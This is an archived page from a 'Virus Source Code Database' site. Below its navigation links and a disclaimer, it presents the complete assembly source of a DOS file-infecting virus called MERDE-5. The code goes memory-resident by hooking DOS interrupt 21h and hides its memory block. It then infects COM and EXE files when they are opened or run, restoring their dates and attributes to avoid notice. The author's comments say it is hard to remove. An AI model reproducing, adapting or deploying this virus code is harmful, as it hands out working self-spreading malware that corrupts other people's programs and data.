<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: loki1237_asm</title>
<meta name="KEYWORDS" content="loki1237.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for loki1237.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="lamark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lamark_asm.php">lamark_asm</a><br>
<a href="lct_599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_599_asm.php">lct_599_asm</a><br>
<a href="lct-599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-599_asm.php">lct-599_asm</a><br>
<a href="lct_762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_762_asm.php">lct_762_asm</a><br>
<a href="lct-762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-762_asm.php">lct-762_asm</a><br>
<a href="leap-fro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leap-fro_asm.php">leap-fro_asm</a><br>
<a href="leapfrog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leapfrog_asm.php">leapfrog_asm</a><br>
<a href="leech__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech__asm.php">leech__asm</a><br>
<a href="leech_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech_asm.php">leech_asm</a><br>
<a href="lehi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehi_asm.php">lehi_asm</a><br>
<a href="lehigh___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh___asm.php">lehigh___asm</a><br>
<a href="lehigh__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh__asm.php">lehigh__asm</a><br>
<a href="lehigh_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh_asm.php">lehigh_asm</a><br>
<a href="lep-664a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lep-664a_asm.php">lep-664a_asm</a><br>
<a href="lepmisry_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lepmisry_asm.php">lepmisry_asm</a><br>
<a href="leprosb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosb2_asm.php">leprosb2_asm</a><br>
<a href="leprosy_2_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_2_c.php">leprosy_2_c</a><br>
<a href="leprosy_3_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_3_c.php">leprosy_3_c</a><br>
<a href="leprosy__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy__asm.php">leprosy__asm</a><br>
<a href="leprosyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyb_asm.php">leprosyb_asm</a><br>
<a href="leprosy_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_c.php">leprosy_c</a><br>
<a href="leprosyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyc_asm.php">leprosyc_asm</a><br>
<a href="leprsyb1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb1_asm.php">leprsyb1_asm</a><br>
<a href="leprsyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb_asm.php">leprsyb_asm</a><br>
<a href="leps808d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leps808d_asm.php">leps808d_asm</a><br>
<a href="leszop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leszop_asm.php">leszop_asm</a><br>
<a href="libertyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/libertyb_asm.php">libertyb_asm</a><br>
<a href="lisa__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa__asm.php">lisa__asm</a><br>
<a href="lisa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa_asm.php">lisa_asm</a><br>
<a href="lisbon2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisbon2_asm.php">lisbon2_asm</a><br>
<a href="lit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lit_asm.php">lit_asm</a><br>
<a href="littl139_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/littl139_asm.php">littl139_asm</a><br>
<a href="little__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/little__asm.php">little__asm</a><br>
<a href="load_sec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/load_sec_asm.php">load_sec_asm</a><br>
<a href="lock2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock2_asm.php">lock2_asm</a><br>
<a href="lock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock_asm.php">lock_asm</a><br>
<a href="lockjaw__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw__asm.php">lockjaw__asm</a><br>
<a href="lockjaw_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw_asm.php">lockjaw_asm</a><br>
<a href="lockout2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout2_asm.php">lockout2_asm</a><br>
<a href="lockout_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout_asm.php">lockout_asm</a><br>
<a href="loki1237_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki1237_asm.php">loki1237_asm</a><br>
<a href="loki_973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki_973_asm.php">loki_973_asm</a><br>
<a href="loki-973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki-973_asm.php">loki-973_asm</a><br>
<a href="lokjawd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawd_asm.php">lokjawd_asm</a><br>
<a href="lokjawz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawz_asm.php">lokjawz_asm</a><br>
<a href="lordzero_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lordzero_asm.php">lordzero_asm</a><br>
<a href="lqcancer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lqcancer_asm.php">lqcancer_asm</a><br>
<a href="ltbro299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro299_asm.php">ltbro299_asm</a><br>
<a href="ltbro307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro307_asm.php">ltbro307_asm</a><br>
<a href="ltbro321_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro321_asm.php">ltbro321_asm</a><br>
<a href="ltbrt299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbrt299_asm.php">ltbrt299_asm</a><br>
<a href="lythyum_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lythyum_asm.php">lythyum_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; Okay, here is my newest version..  It now 
; offers EXE infection.  I messed up command.com
; compatibility so this version won't infect it.
; Also, this version might be a little shakey,
; but it should work okay with most setups
; (I'm not professional yet, so screw 'em
; if this hangs!)..
; This will be the last time I release code for
; my virii.  Thanks to firststrike, and anyone else
; who has given me tips.....
;  Be careful not to get this, it is kinda hard to get rid
;  of (it would be REALLY hard to get rid of if it infected
;command.com- I will have to fix that (along with the TERRIBLE
; inefficiency in my interrupt handler (the loader is OKAY, but
; My_21 is just kind of a jumble of code thrown together for now.
; If you want to vaccinate your system, and you know a little about
; assembler, it isn't that hard. (I gave the come version to
; myself about 3 times).  Just take notice of my use of interrupt
; 71...(This will be changed in future versions, for obvious reasons).
;	MERDE-5 The merde virus version 5.0-			loki


compare_val	equ	850
interrupt	equ	21h
Code_seg	Segment Byte
	Assume DS:Code_seg, CS:Code_seg
	ORG 100h

start:	call	get_ip

exe_or_com:
	dw	'CO'
get_ip:
	pop	di
	sub	di,3
	cmp	word ptr cs:[di+3],'EX'
	jne	com_memory_loader
	jmp	exe_memory_loader

;Load memory from within an EXE file..
;------------------------------------------------------------------------------		
exe_memory_loader:
	call	check_for_int_71
	jc	go
	call	get_memory	;es=my_segment
	jnc	aaaa
	jmp	exit_exe
aaaa:
	call	hide_memory
	call	set_int_71
	call	save_21
	push	ds
	call	move_all_code
	pop	ds
	mov	bx,es
	call	set_21
go:	jmp	exit_exe

;------------------------------------------------------------------------------
;******************************************************************************
;------------------------------------------------------------------------------
;load memory from a COM file...

com_memory_loader:
	call	restore_com
	call	check_for_int_71
	jc	go_1
	call	get_memory
	jnc	bbbb
	jmp	exit_com
	
bbbb:	call	hide_memory

reset_di:
	call	set_int_71
	call	save_21
	call	move_all_code
	mov	bx,es
	call	set_21
go_1:	jmp	exit_com

;------------------------------------------------------------------------------
;Returns ES with my segment (or an error)
;------------------------------------------------------------------------------
get_memory:
	int	12h
	mov	bx,cs
	mov	cx,1024
	mul	cx	
	clc
	mov	cx,600h			;Amount of needed memory
	sub	ax,cx
	sbb	dx,0000			;dx:ax=where we want this mem to end!
	mov	bx,dx
	mov	bp,ax			;save this...
	mov	cx,cs
	mov	ax,0010h
	mul	cx
	clc
	mov	cx,di
	add	cx,offset ending-100h
	add	ax,cx
	adc	dx,0000
	clc
	sub	bp,ax
	sbb	bx,dx
	clc
	mov	ax,bp
	mov	dx,bx
	mov	cx,0010h
	div	cx		;dx:ax=memory above this-divide it by 16
	mov	bx,ax
	mov	ah,4ah
	int	21h
	jc	get_memory_error
	mov	bx,60
	mov	ah,48h
	int	21h
	jc	get_memory_error
	mov	es,ax
	clc
	ret
get_memory_error:
	stc
	ret
;------------------------------------------------------------------------------
;Moves all code + PSP to my secretive little segment-destroys DS (in EXE files)
;------------------------------------------------------------------------------
move_all_code:
;move PSP**************************
	push	di
	xor	si,si
	xor	di,di
	mov	cx,100h
	rep	movsb
;**********************************
;move my code**********************
	pop	si
	push	si
	push	cs
	pop	ds
	mov	cx,offset ending-100h
	rep	movsb
	pop	di
	ret
;**********************************	
;------------------------------------------------------------------------------
;------------------------------------------------------------------------------
;saves interrupt 21 in cs:[int_21_saveo]
save_21:
	push	es
	xor	ax,ax
	mov	es,ax
	mov	ax,es:[interrupt*4]
	mov	bx,es:[interrupt*4+2]
	mov	cs:[di+offset int_21_saveo-100h],ax
	mov	cs:[di+offset int_21_saves-100h],bx
	pop	es
	ret

;-----------------------------------------------------------------------------
;sets interrupt 21 to bx:offset of my_21
set_21:
	push	es
	xor	ax,ax
	mov	es,ax
	mov	es:[interrupt*4],offset my_21
	mov	es:[interrupt*4+2],bx
	pop	es
	ret
;-----------------------------------------------------------------------------
;-----------------------------------------------------------------------------
;Restores a COM file
restore_com:
	push	di
	mov	si,di
	add	si,offset three_bytes-100h
	mov	di,0100h
	mov	cx,3
	rep	movsb
	pop	di
	ret
;------------------------------------------------------------------------------
;Hides my segment's (es) size and owner
hide_memory:
	push	ds
	xor	cx,cx
	mov	ds,cx
	mov	cx,ds:[2eh*4+2]
	pop	ds
	push	ds
	mov	dx,es
	dec	dx
	mov	ds,dx
	mov	ds:[1],cx			;maybe later set to DOS seg
	mov	byte ptr ds:[0],'Z'
	mov	word ptr ds:[3],0000
	mov	es:[16h],cx
	mov	es:[0ah],cx
	mov	es:[0ch],cx
	pop	ds
	ret
;------------------------------------------------------------------------------

;check_for_int 71-  My little multiplex interrupt
check_for_int_71:
	int	71h
	cmp	ax,9999h
	je	set_c
	clc
	ret
set_c:
	stc
	ret
;------------------------------------------------------------------------------

;Set interrupt 71:
set_int_71:
	push	ds
	xor	ax,ax
	mov	ds,ax
	mov	ds:[71h*4+2],es
	mov	ds:[71h*4],offset my_71
	pop	ds
	ret


exit_com:
	xor	cx,cx
	xor	dx,dx
	xor	ax,ax
	xor	bx,bx
	xor	si,si
	xor	di,di
	mov	ax,100h
	jmp	ax

exit_exe:
	push	ds
	pop	es
	mov	ax,es
	add	ax,10h
	add	word ptr cs:[di+offset orig_cs-100h],ax
	cli
	add	ax,word ptr cs:[di+offset orig_ss-100h]
	mov	ss,ax
	mov	sp,word ptr cs:[di+offset orig_sp-100h]
	sti
	jmp	dword ptr cs:[di+offset orig_ip-100h]

;------------------------------------------------------------------
my_21:	
	cmp	ah,4bh
	je	okay_go
	cmp	ah,0fh
	je	okay_go
	cmp	ah,3dh
	je	okay_go
	cmp	ah,43h
	je	okay_go
	jmp	continue_21
okay_go:
	push	ax
	push	bx
	push	cx
	push	dx
	push	es
	push	di
	push	si
	push	bp
	push	es
	push	ds
check_for_com:
	xor	si,si
	mov	bx,dx
looper:
	cmp	word ptr ds:[bx+si],'c.'
	je	check_om
	cmp	word ptr ds:[bx+si],'C.'
	je	check_om
	cmp	word ptr ds:[bx+si],'e.'
	je	check_ex
	cmp	word ptr ds:[bx+si],'E.'
	je	check_ex
	inc	si
	cmp	si,40
	jne	looper
	jmp	give_up1
check_om:
	cmp	word ptr ds:[bx+si+2],'mo'
	jne	bb
	mov	cs:[com_or_exe],0
	jmp	check_for_infection
bb:	cmp	word ptr ds:[bx+si+2],'MO'
	jne	cc
	mov	cs:[com_or_exe],0
	jmp	check_for_infection
cc:	jmp	give_up1	
check_ex:
	cmp	word ptr ds:[bx+si+2],'ex'
	jne	label1
	mov	cs:[com_or_exe],1234h
	jmp	okay_do
label1:
	cmp	word ptr ds:[bx+si+2],'EX'		;FIX ME!!!!!!!
	je	cccc				;forget exe for now..
	jmp	give_up1
cccc:
	mov	cs:[com_or_exe],1234h
	jmp	okay_do
check_for_infection:
	cmp	word ptr [bx+si-2],'DN'
	jne	okey_k
	jmp	give_up1
okey_k:
	cmp	word ptr [bx+si-2],'DN'
	jne	okay_do
	jmp	give_up1
okay_do:
	mov	cs:[storage_1],ds
	mov	cs:[storage_2],dx
	mov	ah,50h		;set PSP to ours
	push	cs
	pop	bx
	call	dos_21
	mov	ah,43h
	xor	al,al
	call	dos_21
	jnc	okay9
	jmp	give_up
okay9:	mov	cs:[attrib],cx
	mov	ah,43h
	mov	al,1
	xor	cx,cx
	call	dos_21
	mov	ah,3dh
	mov	al,2
	call	dos_21
	jnc	okay10
	jmp	give_up
okay10:	mov	cs:[handle],ax
	mov	bx,ax
	mov	ah,57h
	xor	al,al
	call	dos_21
	mov	cs:[date],dx
	mov	cs:[time],cx
	mov	ax,4202h
	xor	dx,dx
	xor	cx,cx
	call	dos_21
	jnc	okay11
	jmp	give_up
okay11:	mov	cs:[file_size],ax
	cmp	cs:[com_or_exe],1234h
	jne	okey_p
	sub	ax,compare_val
	sbb	dx,0000
	mov	cx,dx
	mov	dx,ax
	jmp	contin2
okey_p:	xor	cx,cx
	cmp	ax,63000
	jb	contin1
	call	reset_all
	jmp	give_up
contin1:
	cmp	ax,600
	jnb	continx
	call	reset_all
	jmp	give_up
continx:
	sub	ax,compare_val
	mov	dx,ax
	xor	cx,cx
contin2:
	mov	ax,4200h
	mov	bx,cs:[handle]
	call	dos_21
	mov	ah,3fh
	push	cs
	pop	ds
	mov	dx,offset buffer
	mov	cx,2
	call	dos_21
	mov	ax,word ptr cs:[buffer]
	mov	bx,word ptr cs:[offset dont_write-compare_val]
	cmp	ax,bx
	jne	dddd
	jmp	give_up
dddd:
	cmp	cs:[com_or_exe],1234h
	je	infect_exe
	jmp	infect_com

infect_exe:
	mov	bx,cs:[handle]
	xor	dx,dx
	xor	cx,cx
	mov	ax,4200h
	call	dos_21
	push	cs
	pop	ds
	mov	ah,3fh
	mov	cx,18h
	mov	dx,offset header
	call	dos_21
	cmp	word ptr [header+8],1000h
	jb	okayh
	call	reset_all
	jmp	give_up
okayh:	mov	ax,word ptr [header+16h]
	mov	orig_cs,ax
	mov	ax,word ptr [header+14h]
	mov	orig_ip,ax
	mov	ax,word ptr [header+0eh]
	mov	orig_ss,ax
	mov	ax,word ptr [header+10h]
	mov	orig_sp,ax
	mov	ax,4202h
	mov	bx,handle
	xor	cx,cx
	xor	dx,dx
	call	dos_21
	mov	word ptr ds:[exe_or_com],'EX'
	mov	high_size,dx
	mov	low_size,ax
	mov	real_hsize,dx
	mov	real_lsize,ax
	mov	ax,word ptr [header+8]
	mov	cx,10h
	mul	cx
	clc
	sub	low_size,ax		;high_size:low_size=load size
	sbb	high_size,dx
	clc
	mov	dx,high_size
	mov	ax,low_size
	mov	cx,0010h
	div	cx
	cmp	dx,0
	je	okay
	mov	cx,16
	sub	cx,dx
	mov	bp,cx
	add	real_lsize,bp
	adc	real_hsize,0000
	clc
	stc
	adc	ax,0000
	jmp	okay1
okay:	xor	bp,bp
okay1:	xor	dx,dx
	mov	word ptr [header+16h],ax
	;add to dx?
	mov	word ptr [header+14h],dx
	mov	word ptr [header+0eh],ax
	mov	dx,0fffeh
	mov	word ptr [header+10h],dx
	mov	dx,real_hsize
	mov	ax,real_lsize
	add	ax,offset ending-100h+1
	adc	dx,0000
	push	ax
	mov	cl,9
	shr	ax,cl
	ror	dx,cl
	stc
	adc	dx,ax
	pop	ax
	and	ah,1
	mov	word ptr [header+4],dx
	mov	word ptr [header+2],ax	
	mov	ah,40h
	mov	bx,handle
	mov	cx,offset dont_write-100h
	add	cx,bp
	mov	dx,100h
	sub	dx,bp
	call	dos_21
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
	mov	bx,handle
	call	dos_21
	mov	ah,40h
	mov	bx,handle
	mov	cx,18h
	mov	dx,offset header
	call	dos_21
	call	reset_all
	jmp	give_up

infect_com:
	xor	cx,cx
	xor	dx,dx
	mov	bx,cs:[handle]
	mov	ax,4200h
	call	dos_21
	mov	ah,3fh
	mov	cx,3
	push	cs
	pop	ds
	mov	dx,offset three_bytes
	call	dos_21
	mov	ax,cs:[file_size]
	sub	ax,3
	mov	word ptr cs:[jumper+1],ax
	mov	word ptr cs:[exe_or_com],'CO'
	call	write_to_end
	xor	cx,cx
	xor	dx,dx
	mov	ax,4200h
	mov	bx,cs:[handle]
	call	dos_21
	mov	dx,offset jumper
	mov	ah,40h
	mov	cx,3
	call	dos_21
	call	reset_all
give_up:
	mov	ah,50h
	mov	bx,cs:[storage_1]
	call	dos_21
give_up1:
	pop	ds
	pop	es
	pop	bp
	pop	si
	pop	di
	pop	es
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	jmp	continue_21
continue_21:
	jmp	dword ptr cs:[int_21_saveo]
dos_21:
	pushf
	call	dword ptr cs:[int_21_saveo]
	ret

reset_all:
	mov	bx,cs:[handle]
	mov	cx,cs:[time]
	mov	dx,cs:[date]
	mov	ax,5701h
	call	dos_21
	mov	ah,3eh
	mov	bx,cs:[handle]
	call	dos_21
	mov	ah,43h
	mov	al,1
	mov	cx,cs:[attrib]
	mov	ds,cs:[storage_1]
	mov	dx,cs:[storage_2]
	call	dos_21
	ret	

write_to_end:
	
	mov	ax,4202h
	xor	dx,dx
	xor	cx,cx
	mov	bx,cs:[handle]
	call	dos_21
	mov	ah,40h
	mov	cx,offset dont_write-100h
	push	cs
	pop	ds
	mov	dx,0100h
	call	dos_21
	ret
my_71:
	mov	ax,9999h
	iret


jumper:
	db	0e9h,00,00
storage_1	dw	0000
storage_2	dw	0000
int_21_saveo	dw	0000
int_21_saves	dw	0000
three_bytes:	db	0cdh,20h,90h
db	'Loki'
orig_ip		dw	0000
orig_cs		dw	0000
orig_ss		dw	0000
orig_sp		dw	0000
dont_write:

header:
		db 24 dup(00)
com_or_exe	dw	1234h
handle		dw	0000
file_size	dw	0000
attrib		dw	0000
date		dw	0000
time		dw	0000
buffer:		dw	0000
loader_high	dw	0000
loader_low	dw	0000
header_cs	dw	0000
header_ip	dw	0000
low_size	dw	0000
high_size	dw	0000
real_hsize	dw	0000
real_lsize	dw	0000
ending:
Code_seg 	ENDS
END	start
</textarea></td></tr></table></body></html>
